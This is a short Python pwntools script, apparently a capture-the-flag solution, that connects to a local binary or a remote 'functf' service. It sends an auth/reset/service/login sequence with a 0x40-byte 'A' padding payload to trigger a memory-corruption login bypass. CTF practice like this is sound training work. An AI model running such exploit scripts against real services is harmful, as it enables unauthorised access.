from pwn import *

if len(sys.argv)==1:
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
elif sys.argv[1]=="3":
    p=remote("functf",18013)

p.sendline("auth aaa")
p.sendline("reset")
p.sendline("service"+"A"*0x40)
p.sendline("login")

p.interactive()
